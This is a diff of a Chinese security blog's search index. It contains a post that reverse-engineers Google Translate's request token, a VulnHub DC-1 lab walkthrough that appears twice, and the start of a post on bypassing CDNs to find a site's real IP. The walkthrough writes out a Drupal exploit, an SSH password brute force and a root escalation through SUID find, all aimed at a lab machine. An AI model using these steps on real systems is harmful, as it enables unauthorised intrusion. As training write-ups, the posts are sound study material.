b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>发现做了很多不必要的操作、甚至多此一举，目的是用于混淆<br>
+如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var mu &#x3D; function(a) &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还用了<code>.fromCharCode()</code>函数，把数字转换为字母，明显多此一举的操作。但是，通过分析，发现<code>tk</code>生成需要另一样东西，就是<code>tkk</code>这个参数，来源于网页源代码上，寻找一番，还是发现了，多次尝试，发现这个值是固定的</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529145556.png" alt=""></p>
+<h4 id="具体实现">具体实现</h4>
+<p>说明：js文件做了精炼，把不必要的值去掉了，实行的效果是英译中，不同语言的翻译修改请求的参数即可</p>
+<ul>
+<li>Python脚本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tk</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;google_tk.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        js = f.read()</span><br><span class="line">    j = execjs.<span class="built_in">compile</span>(js)</span><br><span class="line">    tk = j.call(<span class="string">&#x27;pu&#x27;</span>, q)</span><br><span class="line">    <span class="keyword">return</span> tk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate_google</span>():</span></span><br><span class="line">    q = <span class="built_in">input</span>(<span class="string">&quot;请输入你要翻译的内容：&quot;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://translate.google.cn/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk=&quot;</span> + get_tk(</span><br><span class="line">        q) + <span class="string">&quot;&amp;q=&quot;</span> + q</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    data = res.content.decode()</span><br><span class="line">    json_data = json.loads(data)</span><br><span class="line">    print(json_data[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    translate_google()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>tk.js</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tkk = &#x27;441865.2154418832&#x27;;</span></span><br><span class="line"><span class="keyword">var</span> nu = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">pu = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    tkk=<span class="string">&#x27;441865.2154418832&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> d = tkk.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">Number</span>(d[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h :</span><br><span class="line">            (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> :</span><br><span class="line">                    (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>), e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>, e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) :</span><br><span class="line">                        e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>, e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>), e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="运行效果">运行效果</h4>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529150718.png" alt=""></p>
+<h3 id="二、总结常见算法的加密原理">二、总结常见算法的加密原理</h3>
+<ul>
+<li>散列(hash)函数算法：MD5、SHA</li>
+<li>对称加密算法：DES、3DES、AES</li>
+<li>非对称性加密算法：RSA、DSA、ECC</li>
+</ul>
+<h4 id="散列-hash-函数算法">散列(hash)函数算法</h4>
+<ul>
+<li>简介</li>
+</ul>
+<p>Hash也称散列、哈希，对应的英文都是Hash。基本原理就是把任意长度的输入，通过Hash算法变成固定长度的输出。这个映射的规则就是对应的Hash算法，而原始数据映射后的二进制串就是哈希值。活动开发中经常使用的MD5和SHA都是历史悠久的Hash算法。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo md5(&quot;这是一个测试文案&quot;);&#x2F;&#x2F; 输出结果：2124968af757ed51e71e6abeac04f98d</span><br></pre></td></tr></table></figure>
+<ul>
+<li>特点</li>
+</ul>
+<p>一、不可逆，与原视数据没有对应关系<br>
+二、输入数据的微小变化会得到完全不同的hash值，相同的数据会得到相同的值<br>
+三、hash算法冲突概率比较小，但是根据抽屉原理，一定会存在不同的输入被映射成相同输出的情况</p>
+<h4 id="对称加密算法">对称加密算法</h4>
+<ul>
+<li>简介</li>
+</ul>
+<p>秘钥：加密解密使用同一个密钥、数据的机密性双向保证、加密效率高、适合加密于大数据大文件、加密强度不高(相对于非对称加密)</p>
+<h4 id="非对称性加密算法">非对称性加密算法</h4>
+<ul>
+<li>简介</li>
+</ul>
+<p>秘钥：加密解密使用的不同秘钥、有两个密钥、需要使用密钥生成算法生成两个秘钥、数据的机密性只能单向加密、如果想解决这个问题、双向都需要各自有一对秘钥、加密效率低、加密强度高</p>
+]]></content>
+      <categories>
+        <category>JS逆向</category>
+      </categories>
+      <tags>
+        <tag>JS逆向系列</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SqlMap总结</title>
     <url>/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="SqlMap测试基本流程">SqlMap测试基本流程</h2>
@@ -883,144 +883,6 @@ linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =<br>
       </categories>
       <tags>
         <tag>Sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VulnHub渗透之DC-1</title>
-    <url>/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/</url>
-    <content><![CDATA[<h2 id="0×00-说明">0×00 说明</h2>
-<blockquote>
-<p>kali与目标处于同一网段下<br>
-攻击机：Kali(VMware ) IP:192.168.1.31</p>
-</blockquote>
-<p>特别说明：每个靶机作者都对靶机做了详细的描述以及攻击目标，比如DC1就需要找到5个flag，最终目标是在root的主目录中找到并读取该标志！</p>
-<p>通过每个flag所获得知识点</p>
-<p>1、msf的熟练使用以及搜索可利用漏洞（Drupal）；</p>
-<p>2、留意目标网站的配置文件（慢慢查看别错过重要信息）；</p>
-<p>3、数据库管理员提权（更新管理员密码或者添加一个新用户）；</p>
-<p>4、suid提权的命令（nmap、vim、find、bash、more、less、nano、cp）。</p>
-<h2 id="0×01-信息收集">0×01 信息收集</h2>
-<h3 id="探测目标IP">探测目标IP</h3>
-<p>namp -sP 192.168.1.0/24<br>
-arp-scan -l	//扫描当前网段下的IP<br>
-Cadmus Computer Systems 表示Virtualbox虚拟机<br>
-分析得出目标IP为192.168.1.30</p>
-<blockquote>
-<p>靶机：DC-1(Virtualbox) IP:192.168.1.30</p>
-</blockquote>
-<h3 id="扫描端口">扫描端口</h3>
-<p>nmap -sV -p- 192.168.1.30	//扫描全端口<br>
--sV 用来扫描目标主机和端口上运行的软件的版本<br>
--p- 扫描0-65535全部端口</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524190438.png" alt=""></p>
-<p>80端口开放，访问一下</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191012.png" alt=""></p>
-<p>Wappalyzer进行网站指纹识别，查看到是Drupal 7</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191337.png" alt=""></p>
-<p>查看一下robots.txt文件已经目录扫描(省略)。。发现没有可利用的地方</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524192628.png" alt=""></p>
-<h2 id="0×02metasploit">0×02metasploit</h2>
-<p>直接上metasploit</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@sf:~# msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524201135.png" alt=""></p>
-<p>选择4，drupalgeddon2的exp，设置下rhost，直接exploit，成功</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524212454.png" alt=""></p>
-<p>接下来使用msf自带的shell</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213300.png" alt=""></p>
-<h3 id="发现flag1">发现flag1</h3>
-<p>查看当前路径下的文件，发现<code>flag1.txt</code>文件，查看一下，发现提示CMS配置文件有猫腻</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213406.png" alt=""></p>
-<h3 id="发现flag2">发现flag2</h3>
-<p>网上搜索得知，Drupal 7的默认配置文件为<code>sites/default/settings.php</code>，查看发现flag2，还有数据库连接信息</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213927.png" alt=""></p>
-<h2 id="0×003-弯路">0×003 弯路</h2>
-<p>尝试连接数据库，结果连接失败，应该是权限不足</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214247.png" alt=""></p>
-<h3 id="爆破flag4用户密码">爆破flag4用户密码</h3>
-<p>于是去查看<code>/etc/passwd</code>文件，发现flag4用户</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214358.png" alt=""></p>
-<p>使用hydra尝试爆破flag4用户的密码，<code>hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.1.30</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214646.png" alt=""></p>
-<p>成功爆破flag4的密码，为 orange ，接下来ssh登录flag4用户，查看当前路径下有<code>flag4.txt</code>，得到新的提示——root目录里有个flag</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215013.png" alt=""></p>
-<h2 id="0×04-连接数据库">0×04 连接数据库</h2>
-<p>然后我们连接数据库，这次成功</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215205.png" alt=""></p>
-<p>顺藤摸瓜，仔细查找数据库</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215355.png" alt=""></p>
-<p>查看user表，发现admin用户</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215445.png" alt=""></p>
-<p>查看role表</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215512.png" alt=""></p>
-<p>查看role_permission表</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215644.png" alt=""></p>
-<p>查看node表</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215712.png" alt=""></p>
-<h3 id="发现flag3">发现flag3</h3>
-<p>发现flag3，得知uid为1的用户是不受Drupal权限管制的，具有最高权限，uid 1用户也就是admin，</p>
-<h2 id="0×05-两个思路">0×05 两个思路</h2>
-<h3 id="一、重置管理员密码">一、重置管理员密码</h3>
-<p>使用Drupal对数据库的加密方法，加密脚本位置在网站根目录下的script下(msf shell)，使用脚本生成加密密文，然后登陆数据库修改admin的密码</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222511.png" alt=""></p>
-<p>修改密码为123456</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222543.png" alt=""></p>
-<p>成功登陆</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222616.png" alt=""></p>
-<h3 id="二、添加一个管理员权限的用户">二、添加一个管理员权限的用户</h3>
-<p>先查看一下靶机的版本，7.24</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232222.png" alt=""></p>
-<p>msf搜索Druapl 7.24对应可利用的脚本，发现一个符合</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232538.png" alt=""></p>
-<p>运行脚本，进行利用</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232830.png" alt=""></p>
-<p>增加了一个用户user，密码为123456，尝试登陆网站，发现登陆成功</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524233018.png" alt=""></p>
-<h3 id="发现flag3-2">发现flag3</h3>
-<p>从网站上找到了flag3的界面，得到提示<code>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.</code>，重点在（FIND the passwd、need to -exec that command、in the shadow）</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524223823.png" alt=""></p>
-<p>根据线索，我们又找到了flag4以及它的目录，再根据flag4的提示，（用相同的方法在root目录下）找到最终flag</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524224339.png" alt=""></p>
-<h2 id="0×06-提权">0×06 提权</h2>
-<p>于是，想到suid提权，查询具有root权限的命令，以下均可查询：</p>
-<ul>
-<li>find / -user root -perm -4000 -print 2&gt;/dev/null</li>
-<li>find / -perm -u=s -type f 2&gt;/dev/null</li>
-<li>find / -user root -perm -4000 -exec ls -ldb { }<br>
-注： -type f即文件，-perm -u=s 即user权限位为suid</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230257.png" alt=""></p>
-<p>发现<code>find</code>命令本身就是root权限</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230453.png" alt=""></p>
-<p>于是就用<code>find</code>提权，<code>find ./ aaa -exec '/bin/sh' \\;</code> ，或者新建一个文件，验证一下，已经是root了</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230955.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231608.png" alt=""></p>
-<h3 id="最终flag">最终flag</h3>
-<p>接着找到根目录下的root目录，里面就是最终的flag</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231307.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231720.png" alt=""></p>
-<h2 id="0×07-总结">0×07 总结</h2>
-<p>DC-1找到最终的flag并不难，难在找齐五个flag，第一次实验，很生疏，存在很多问题：</p>
-<ul>
-<li>
-<p>metasploit 熟练度不足，且exploit模块成功后的shell不是交互性，DC-1安装了python环境，可以通过pty.spawn()获得交互性shell</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524235827.png" alt=""></p>
-</li>
-<li>
-<p>exploitdb熟练度也不足</p>
-</li>
-<li>
-<p>Linux熟练度不足，find命令，有待学习</p>
-</li>
-<li>
-<p>suid提权的命令（nmap、vim、find、bash、more、less、nano、cp），有待学习</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>VulnHub</tag>
       </tags>
   </entry>
   <entry>
@@ -1164,6 +1026,203 @@ Cadmus Computer Systems 表示Virtualbox虚拟机<br>
       </tags>
   </entry>
   <entry>
+    <title>VulnHub渗透之DC-1</title>
+    <url>/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/</url>
+    <content><![CDATA[<h2 id="0×00-说明">0×00 说明</h2>
+<blockquote>
+<p>kali与目标处于同一网段下<br>
+攻击机：Kali(VMware ) IP:192.168.1.31</p>
+</blockquote>
+<p>特别说明：每个靶机作者都对靶机做了详细的描述以及攻击目标，比如DC1就需要找到5个flag，最终目标是在root的主目录中找到并读取该标志！</p>
+<p>通过每个flag所获得知识点</p>
+<p>1、msf的熟练使用以及搜索可利用漏洞（Drupal）；</p>
+<p>2、留意目标网站的配置文件（慢慢查看别错过重要信息）；</p>
+<p>3、数据库管理员提权（更新管理员密码或者添加一个新用户）；</p>
+<p>4、suid提权的命令（nmap、vim、find、bash、more、less、nano、cp）。</p>
+<h2 id="0×01-信息收集">0×01 信息收集</h2>
+<h3 id="探测目标IP">探测目标IP</h3>
+<p>namp -sP 192.168.1.0/24<br>
+arp-scan -l	//扫描当前网段下的IP<br>
+Cadmus Computer Systems 表示Virtualbox虚拟机<br>
+分析得出目标IP为192.168.1.30</p>
+<blockquote>
+<p>靶机：DC-1(Virtualbox) IP:192.168.1.30</p>
+</blockquote>
+<h3 id="扫描端口">扫描端口</h3>
+<p>nmap -sV -p- 192.168.1.30	//扫描全端口<br>
+-sV 用来扫描目标主机和端口上运行的软件的版本<br>
+-p- 扫描0-65535全部端口</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524190438.png" alt=""></p>
+<p>80端口开放，访问一下</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191012.png" alt=""></p>
+<p>Wappalyzer进行网站指纹识别，查看到是Drupal 7</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191337.png" alt=""></p>
+<p>查看一下robots.txt文件已经目录扫描(省略)。。发现没有可利用的地方</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524192628.png" alt=""></p>
+<h2 id="0×02metasploit">0×02metasploit</h2>
+<p>直接上metasploit</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@sf:~# msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524201135.png" alt=""></p>
+<p>选择4，drupalgeddon2的exp，设置下rhost，直接exploit，成功</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524212454.png" alt=""></p>
+<p>接下来使用msf自带的shell</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213300.png" alt=""></p>
+<h3 id="发现flag1">发现flag1</h3>
+<p>查看当前路径下的文件，发现<code>flag1.txt</code>文件，查看一下，发现提示CMS配置文件有猫腻</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213406.png" alt=""></p>
+<h3 id="发现flag2">发现flag2</h3>
+<p>网上搜索得知，Drupal 7的默认配置文件为<code>sites/default/settings.php</code>，查看发现flag2，还有数据库连接信息</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213927.png" alt=""></p>
+<h2 id="0×003-弯路">0×003 弯路</h2>
+<p>尝试连接数据库，结果连接失败，应该是权限不足</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214247.png" alt=""></p>
+<h3 id="爆破flag4用户密码">爆破flag4用户密码</h3>
+<p>于是去查看<code>/etc/passwd</code>文件，发现flag4用户</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214358.png" alt=""></p>
+<p>使用hydra尝试爆破flag4用户的密码，<code>hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.1.30</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214646.png" alt=""></p>
+<p>成功爆破flag4的密码，为 orange ，接下来ssh登录flag4用户，查看当前路径下有<code>flag4.txt</code>，得到新的提示——root目录里有个flag</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215013.png" alt=""></p>
+<h2 id="0×04-连接数据库">0×04 连接数据库</h2>
+<p>然后我们连接数据库，这次成功</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215205.png" alt=""></p>
+<p>顺藤摸瓜，仔细查找数据库</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215355.png" alt=""></p>
+<p>查看user表，发现admin用户</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215445.png" alt=""></p>
+<p>查看role表</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215512.png" alt=""></p>
+<p>查看role_permission表</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215644.png" alt=""></p>
+<p>查看node表</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215712.png" alt=""></p>
+<h3 id="发现flag3">发现flag3</h3>
+<p>发现flag3，得知uid为1的用户是不受Drupal权限管制的，具有最高权限，uid 1用户也就是admin，</p>
+<h2 id="0×05-两个思路">0×05 两个思路</h2>
+<h3 id="一、重置管理员密码">一、重置管理员密码</h3>
+<p>使用Drupal对数据库的加密方法，加密脚本位置在网站根目录下的script下(msf shell)，使用脚本生成加密密文，然后登陆数据库修改admin的密码</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222511.png" alt=""></p>
+<p>修改密码为123456</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222543.png" alt=""></p>
+<p>成功登陆</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222616.png" alt=""></p>
+<h3 id="二、添加一个管理员权限的用户">二、添加一个管理员权限的用户</h3>
+<p>先查看一下靶机的版本，7.24</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232222.png" alt=""></p>
+<p>msf搜索Druapl 7.24对应可利用的脚本，发现一个符合</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232538.png" alt=""></p>
+<p>运行脚本，进行利用</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232830.png" alt=""></p>
+<p>增加了一个用户user，密码为123456，尝试登陆网站，发现登陆成功</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524233018.png" alt=""></p>
+<h3 id="发现flag3-2">发现flag3</h3>
+<p>从网站上找到了flag3的界面，得到提示<code>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.</code>，重点在（FIND the passwd、need to -exec that command、in the shadow）</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524223823.png" alt=""></p>
+<p>根据线索，我们又找到了flag4以及它的目录，再根据flag4的提示，（用相同的方法在root目录下）找到最终flag</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524224339.png" alt=""></p>
+<h2 id="0×06-提权">0×06 提权</h2>
+<p>于是，想到suid提权，查询具有root权限的命令，以下均可查询：</p>
+<ul>
+<li>find / -user root -perm -4000 -print 2&gt;/dev/null</li>
+<li>find / -perm -u=s -type f 2&gt;/dev/null</li>
+<li>find / -user root -perm -4000 -exec ls -ldb { }<br>
+注： -type f即文件，-perm -u=s 即user权限位为suid</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230257.png" alt=""></p>
+<p>发现<code>find</code>命令本身就是root权限</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230453.png" alt=""></p>
+<p>于是就用<code>find</code>提权，<code>find ./ aaa -exec '/bin/sh' \\;</code> ，或者新建一个文件，验证一下，已经是root了</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230955.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231608.png" alt=""></p>
+<h3 id="最终flag">最终flag</h3>
+<p>接着找到根目录下的root目录，里面就是最终的flag</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231307.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231720.png" alt=""></p>
+<h2 id="0×07-总结">0×07 总结</h2>
+<p>DC-1找到最终的flag并不难，难在找齐五个flag，第一次实验，很生疏，存在很多问题：</p>
+<ul>
+<li>
+<p>metasploit 熟练度不足，且exploit模块成功后的shell不是交互性，DC-1安装了python环境，可以通过pty.spawn()获得交互性shell</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524235827.png" alt=""></p>
+</li>
+<li>
+<p>exploitdb熟练度也不足</p>
+</li>
+<li>
+<p>Linux熟练度不足，find命令，有待学习</p>
+</li>
+<li>
+<p>suid提权的命令（nmap、vim、find、bash、more、less、nano、cp），有待学习</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>绕过CDN寻找真实IP</title>
+    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
+    <content><![CDATA[<blockquote>
+<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
+</blockquote>
+<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
+<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
+<h2 id="二、子域名">二、子域名</h2>
+<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
+常用的子域名查找方法和工具：</p>
+<ol>
+<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
+<li>在线查询网站：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>子域名爆破工具</li>
+</ol>
